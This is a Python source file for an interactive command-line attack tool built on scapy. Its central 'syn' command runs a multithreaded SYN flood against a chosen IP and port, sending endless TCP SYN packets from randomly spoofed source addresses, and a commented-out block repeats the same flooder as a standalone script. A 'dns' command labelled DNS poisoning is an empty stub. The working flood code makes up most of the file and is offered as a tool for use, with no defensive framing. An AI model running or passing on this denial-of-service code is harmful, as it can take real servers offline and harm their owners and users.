import socket, random, sys, threading
import cmd
import logging
import string, sys
from scapy.all import *


#targetip = ""
#port =""

'''TODO : cant get ip address. follow example 
'''
class sendSYN(threading.Thread):
        def __init__(self, targetip, port):
                threading.Thread.__init__(self)
		self.targetip = targetip
		self.port = port
	
        def run(self):
                i = IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = self.targetip

                t = TCP()
                t.sport = random.randint(1,65535)
                t.dport = self.port
                t.flags = 'S'

                send(i/t, verbose=0)

 
class CLI(cmd.Cmd):

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = '> '

    def do_fuck(self, arg):
	"""shits gettin fucked up"""
        print "hello again", arg, "!"

    def do_ip(self, arg):
	"""Gets local IP address.
	    Takes no arguements."""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	ip = (s.getsockname()[0])
	print ip
	s.close()

    def do_dns(self, arg):
	"""DNS Poisioning."""	
    
    def do_syn(self, arg):
	"""syn [target ip] [port]
    #########################################
    # 
    # SYNflood - A multithreaded SYN Flooder
    # author: arthurnn
    #
    #
    #########################################

	   SYN flood: https://github.com/arthurnn/SynFlood  
	    """
	if not(arg):
	    print "No ip entered"
    
	else:

	    print "\n",arg,"\n"
    
	    targetlist = arg.split(" ")
    
	    print targetlist

	    targetip = targetlist[0]	
	    print targetip

	    port = int(targetlist[1])	
	    print port
	
	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
	
	    total = 0
	    conf.iface='lo';#network card XD

 
	    while 1:
		syner = sendSYN(targetip, port)
		syner.start()
		total += 1
		sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
	
	
    def help_hello(self):
        print "syntax: hello [message]",
        print "-- prints a hello message"

    def do_quit(self, arg):
        sys.exit(1)

    def help_quit(self):
        print "syntax: quit",
        print "-- terminates the application"

    # shortcuts
    do_q = do_quit

if __name__ == '__main__':

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
   
#    print "Please enter network interface:"
    conf.iface = raw_input("Enter network interface: ")  
#    conf.iface='lo';#network card XD
    cli = CLI()
    cli.cmdloop()


'''if os.geteuid() != 0:
    sys.exit("[!] Please run as root")
    
total = 0
conf.iface='en1';#network card XD

cli = CLI()
cli.cmdloop()'''

   
'''

if len(sys.argv) != 3:
    print "Usage: %s <Target IP> <Port>" % sys.argv[0]
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

total = 0
conf.iface='en1';#network card XD

class sendSYN(threading.Thread):
    global target, port
    def __init__(self):
    threading.Thread.__init__(self)
    def run(self):
    i = IP()
    i.src = "%i.%i.%i.%i" %
(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    i.dst = target

    t = TCP()
    t.sport = random.randint(1,65535)
    t.dport = port
    t.flags = 'S'

    send(i/t, verbose=0)

print "Flooding %s:%i with SYN packets." % (target, port)
while 1:
    sendSYN().start()
    total += 1
    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
'''
